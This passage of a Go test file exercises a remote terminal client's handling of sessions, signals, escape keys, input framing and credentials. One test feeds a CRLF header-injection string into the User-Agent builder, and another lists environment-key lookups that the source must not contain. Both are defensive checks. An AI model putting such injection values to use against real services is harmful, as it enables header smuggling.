		if res.Code != 2 || con.err.String() != "connect: no login; a person logs in with the systemapi CLI\n" {
			t.Errorf("%s: code %d stderr %q", name, res.Code, con.err.String())
		}
		for _, asked := range e.asked {
			if asked != "SYSTEMAPI_URL" && asked != "SYSTEMAPI_TOKEN_FILE" {
				t.Errorf("%s: the environment was asked for %s", name, asked)
			}
		}
		if strings.Contains(con.err.String()+con.out.String(), key) {
			t.Errorf("%s: the key was printed", name)
		}
	}
	if n := len(cp.requests()); n != 0 {
		t.Errorf("%d requests were sent with no login", n)
	}
	// And with a token file, the key is still not what is sent.
	con := newFakeCon()
	e := goodEnv(t, cp)
	e.vars["SYSTEMAPI_API_KEY"] = key
	cp.terminal = func(ctx context.Context, c *wstest.Conn, r *http.Request) {
		start(ctx, c)
		sendFrame(ctx, c, `{"type":"pty_exit","payload":{"code":0}}`)
	}
	if res := begin(con, e, "web1").wait(t); res.Code != 0 {
		t.Fatalf("%+v %q", res, con.err.String())
	}
	for _, q := range cp.requests() {
		for name, vals := range q.Header {
			if strings.Contains(strings.Join(vals, " "), key) || strings.Contains(q.Query+q.Body, key) {
				t.Errorf("the environment's key was sent in %s of %s", name, q.Path)
			}
		}
	}
	checkClean(t, cp, con)
	// The source names neither the key variable nor a flag for one.
	for _, file := range []string{"connect.go", "api.go", "tokenfile.go", "tokenfile_unix.go", "console_unix.go", "filter.go"} {
		src, err := os.ReadFile(file)
		if err != nil {
			t.Fatal(err)
		}
		for _, bad := range []string{"SYSTEMAPI_API_KEY", "API_KEY", "X-API-Key", "api_key", "os.Getenv", "os.Environ", "LookupEnv"} {
			if strings.Contains(string(src), bad) {
				t.Errorf("%s names %s", file, bad)
			}
		}
	}
}

// Signals: Ctrl-C before the session starts ends it at once with 130;
// SIGTERM and SIGHUP in a session close it and restore the terminal, and
// the caller is told which signal it was.
func TestSignals(t *testing.T) {
	t.Run("interrupt before start", func(t *testing.T) {
		for _, step := range []string{"resolve", "starting"} {
			cp := newFakeCP(t)
			reached := make(chan struct{}, 1)
			hold := func(r *http.Request) {
				reached <- struct{}{}
				select {
				case <-r.Context().Done():
				case <-time.After(10 * time.Second):
				}
			}
			if step == "resolve" {
				cp.resolve = func(w http.ResponseWriter, r *http.Request) { hold(r) }
			} else {
				cp.terminal = func(ctx context.Context, c *wstest.Conn, r *http.Request) {
					sendFrame(ctx, c, `{"type":"pty_status","payload":{"status":"starting"}}`)
					hold(r)
				}
			}
			con := newFakeCon()
			run := begin(con, goodEnv(t, cp), "web1")
			<-reached
			if step == "starting" {
				time.Sleep(100 * time.Millisecond)
			}
			begun := time.Now()
			con.sig <- os.Interrupt
			res := run.wait(t)
			if res.Code != 130 || res.Signal != nil || con.err.String() != "connect: interrupted\n" || time.Since(begun) > 3*time.Second || con.raws.Load() != 0 {
				t.Errorf("%s: %+v stderr %q after %v", step, res, con.err.String(), time.Since(begun))
			}
			checkClean(t, cp, con)
		}
	})
	for _, c := range []struct {
		sig  os.Signal
		code int
	}{{syscall.SIGTERM, 143}, {syscall.SIGHUP, 129}} {
		t.Run(c.sig.String(), func(t *testing.T) {
			cp := newFakeCP(t)
			up := make(chan struct{})
			gone := make(chan struct{})
			cp.terminal = func(ctx context.Context, cn *wstest.Conn, r *http.Request) {
				start(ctx, cn)
				sendBytes(ctx, cn, []byte("\x1b[?1049hfull screen"))
				close(up)
				for {
					if _, ok := readClient(ctx, cn); !ok {
						close(gone)
						return
					}
				}
			}
			con := newFakeCon()
			run := begin(con, goodEnv(t, cp), "web1")
			<-up
			deadline := time.Now().Add(5 * time.Second)
			for !strings.Contains(con.out.String(), "full screen") && time.Now().Before(deadline) {
				time.Sleep(10 * time.Millisecond)
			}
			con.sig <- c.sig
			res := run.wait(t)
			if res.Code != c.code || res.Signal != c.sig || res.RestoreErr != nil {
				t.Errorf("%+v", res)
			}
			if con.raws.Load() != 1 || con.restores.Load() != 1 {
				t.Errorf("raw %d restored %d", con.raws.Load(), con.restores.Load())
			}
			// The alternate screen the host turned on is left.
			if !strings.HasSuffix(con.out.String(), "\x1b[0m\x1b[?25h\x1b[?1049l") {
				t.Errorf("screen %q", con.out.String())
			}
			select {
			case <-gone:
			case <-time.After(5 * time.Second):
				t.Errorf("the socket was not closed")
			}
			checkClean(t, cp, con)
		})
	}
}

// The local escape: after Enter, ~. closes the session here, ~~ sends
// one ~, and a ~ anywhere else is the host's.
func TestLocalEscape(t *testing.T) {
	for _, c := range []struct {
		in   []string
		want string
		quit bool
	}{
		{[]string{"ls ~/x\r"}, "ls ~/x\r", false},
		{[]string{"~~"}, "~", false},
		{[]string{"a~.\r"}, "a~.\r", false},
		{[]string{"\r~~.\r"}, "\r~.\r", false},
		{[]string{"\r~x"}, "\r~x", false},
		{[]string{"\r~", "\r"}, "\r~\r", false},
		{[]string{"\r~\r~."}, "\r~\r", true},
		{[]string{"~."}, "", true},
		{[]string{"ls\r~."}, "ls\r", true},
		{[]string{"ls\r", "~", "."}, "ls\r", true},
		{[]string{"ls\n~.rest"}, "ls\n", true},
	} {
		var e escaper
		var got []byte
		quit := false
		for _, part := range c.in {
			out, q := e.feed([]byte(part))
			got = append(got, out...)
			quit = quit || q
		}
		if string(got) != c.want || quit != c.quit {
			t.Errorf("%q: sent %q quit %v, want %q %v", c.in, got, quit, c.want, c.quit)
		}
	}
	cp := newFakeCP(t)
	typed := make(chan string, 1)
	cp.terminal = func(ctx context.Context, c *wstest.Conn, r *http.Request) {
		start(ctx, c)
		s, _ := inputUntil(ctx, c, "ls\r")
		typed <- s
		for {
			if _, ok := readClient(ctx, c); !ok {
				return
			}
		}
	}
	con := newFakeCon()
	run := begin(con, goodEnv(t, cp), "web1")
	if _, err := con.keys.Write([]byte("ls\r")); err != nil {
		t.Fatal(err)
	}
	<-typed
	if _, err := con.keys.Write([]byte("~.")); err != nil {
		t.Fatal(err)
	}
	res := run.wait(t)
	if res.Code != 1 || !strings.HasSuffix(con.err.String(), "\nconnect: closed\n") || con.restores.Load() != 1 {
		t.Errorf("%+v stderr %q", res, con.err.String())
	}
	checkClean(t, cp, con)
}

// Input is cut into frames the server takes, and a burst of window
// changes becomes few frames that end at the last size.
func TestInputFramesAndResizeCoalescing(t *testing.T) {
	cp := newFakeCP(t)
	type seen struct {
		inputs  int
		largest int
		bytes   int
		resizes [][2]int
	}
	result := make(chan seen, 1)
	cp.terminal = func(ctx context.Context, c *wstest.Conn, r *http.Request) {
		start(ctx, c)
		var s seen
		for {
			f, ok := readClient(ctx, c)
			if !ok {
				return
			}
			switch f.Type {
			case "pty_input":
				s.inputs++
				n := len(f.DataB64) * 3 / 4
				s.bytes += n
				s.largest = max(s.largest, n)
			case "pty_resize":
				s.resizes = append(s.resizes, [2]int{f.Rows, f.Cols})
			case "pty_eof":
				result <- s
				sendFrame(ctx, c, `{"type":"pty_exit","payload":{"code":0}}`)
				return
			}
		}
	}
	con := newFakeCon()
	run := begin(con, goodEnv(t, cp), "web1")
	if _, err := con.keys.Write([]byte(strings.Repeat("x", 100_000))); err != nil {
		t.Fatal(err)
	}
	for i := 1; i <= 40; i++ {
		con.rows.Store(int32(20 + i))
		con.sig <- sigResize
		time.Sleep(5 * time.Millisecond)
	}
	con.rows.Store(5000) // past what the server takes: sent as 1000
	con.sig <- sigResize
	time.Sleep(400 * time.Millisecond)
	if err := con.keys.Close(); err != nil {
		t.Fatal(err)
	}
	var s seen
	select {
	case s = <-result:
	case <-time.After(10 * time.Second):
		t.Fatal("the server saw no end of input")
	}
	if res := run.wait(t); res.Code != 0 {
		t.Errorf("%+v", res)
	}
	if s.bytes < 100_000 || s.largest > inputMax+2 {
		t.Errorf("input: %d bytes in %d frames, largest %d", s.bytes, s.inputs, s.largest)
	}
	if n := len(s.resizes); n < 1 || n > 8 || s.resizes[n-1] != [2]int{1000, 120} {
		t.Errorf("resizes %v", s.resizes)
	}
	checkClean(t, cp, con)
}

// Every code a control plane or a host may send prints this build's own
// meaning through the real path, and nothing else.
func TestEverySentCodePrintsItsMeaning(t *testing.T) {
	r := &run{token: testToken}
	n := 0
	for _, c := range codes.All() {
		if !codes.Sent(c.Code) {
			continue
		}
		n++
		if got := r.listed(c.Code); got != c.Code+": "+c.Meaning {
			t.Errorf("%s: %q", c.Code, got)
		}
	}
	if n < 30 {
		t.Errorf("only %d sent codes", n)
	}
}

// The User-Agent names the client, its version and the protocol, and
// holds nothing else a version string might carry.
func TestAgentName(t *testing.T) {
	for in, want := range map[string]string{
		"v1.2.3":              "sash-connect/v1.2.3 sah/3",
		"(devel)":             "sash-connect/devel sah/3",
		"":                    "sash-connect/unknown sah/3",
		"v1\r\nX-Injected: 1": "sash-connect/v1X-Injected1 sah/3",
		"unknown":             "sash-connect/unknown sah/3",
	} {
		if got := agentName(in); got != want {
			t.Errorf("agentName(%q) = %q", in, got)
		}
	}
}

// Every persistent mode the filter lets a host set is undone on the way
// out, by the same fixed tail, however the session ends.
func TestResetTailOnEveryEnd(t *testing.T) {
	const modes = "\x1b(0\x1b[?7l\x1b[2;3r\x1b=\x1b[?1h\x1b[?12h\x1b[?25lX"
	want := "\x1b(B\x1b>\x1b[?1l\x1b[?7h\x1b[?12l\x1b7\x1b[r\x1b8\x1b[0m\x1b[?25h"
	if resetTail != want {
		t.Fatalf("reset tail %q, want %q", resetTail, want)
	}
	for _, end := range []string{"exit", "SIGTERM", "SIGHUP", "SIGINT", "server close", "plain exit, no mode set"} {
		t.Run(end, func(t *testing.T) {
			cp := newFakeCP(t)
			up := make(chan struct{})
			cp.terminal = func(ctx context.Context, c *wstest.Conn, r *http.Request) {
				start(ctx, c)
				if end == "plain exit, no mode set" {
					sendBytes(ctx, c, []byte("X"))
				} else {
					sendBytes(ctx, c, []byte(modes))
				}
				close(up)
				switch end {
				case "exit", "plain exit, no mode set":
					sendFrame(ctx, c, `{"type":"pty_exit","payload":{"code":0}}`)
				case "server close":
				default:
					for {
						if _, ok := readClient(ctx, c); !ok {
							return
						}
					}
				}
			}
			con := newFakeCon()
			run := begin(con, goodEnv(t, cp), "web1")
			<-up
			deadline := time.Now().Add(5 * time.Second)
			for !strings.Contains(con.out.String(), "X") && time.Now().Before(deadline) {
				time.Sleep(10 * time.Millisecond)
			}
			switch end {
			case "SIGTERM":
				con.sig <- syscall.SIGTERM
			case "SIGHUP":
				con.sig <- syscall.SIGHUP
			case "SIGINT":
				con.sig <- os.Interrupt
			}
			run.wait(t)
			out := con.out.String()
			if !strings.HasSuffix(out, "X"+want) {
				t.Errorf("screen %q, want it to end X then %q", out, want)
			}
			checkClean(t, cp, con)
		})
	}
}

// The wait for started is one deadline from the upgrade: twenty starting
// frames cannot extend it, and a starting frame after started does not
// end a session that outlives that deadline.
func TestStartDeadlineIsNotExtended(t *testing.T) {
	defer func(a, b time.Duration) { firstFrameTimeout, startTimeout = a, b }(firstFrameTimeout, startTimeout)
	firstFrameTimeout, startTimeout = 400*time.Millisecond, 400*time.Millisecond
	t.Run("twenty starting frames", func(t *testing.T) {
		cp := newFakeCP(t)
		cp.terminal = func(ctx context.Context, c *wstest.Conn, r *http.Request) {
			for i := 0; i < 20; i++ {
				sendFrame(ctx, c, `{"type":"pty_status","payload":{"status":"starting"}}`)
				select {
				case <-ctx.Done():
					return
				case <-time.After(100 * time.Millisecond):
				}
			}
			start(ctx, c)
			sendFrame(ctx, c, `{"type":"pty_exit","payload":{"code":0}}`)
		}
		con := newFakeCon()
		begun := time.Now()
		res := begin(con, goodEnv(t, cp), "web1").wait(t)
		if took := time.Since(begun); res.Code != 1 || con.err.String() != "connect: request_failed\n" || took > 1500*time.Millisecond || con.raws.Load() != 0 {
			t.Errorf("code %d stderr %q after %v", res.Code, con.err.String(), took)
		}
		checkClean(t, cp, con)
	})
	t.Run("starting after started", func(t *testing.T) {
		cp := newFakeCP(t)
		cp.terminal = func(ctx context.Context, c *wstest.Conn, r *http.Request) {
			start(ctx, c)
			sendFrame(ctx, c, `{"type":"pty_status","payload":{"status":"starting"}}`)
			time.Sleep(900 * time.Millisecond)
			sendFrame(ctx, c, `{"type":"pty_exit","payload":{"code":0}}`)
		}
		con := newFakeCon()
		res := begin(con, goodEnv(t, cp), "web1").wait(t)
		if res.Code != 0 || con.err.String() != "connect: session on web1 ("+testHostID+")\n" {
			t.Errorf("code %d stderr %q", res.Code, con.err.String())
		}
		checkClean(t, cp, con)
	})
}
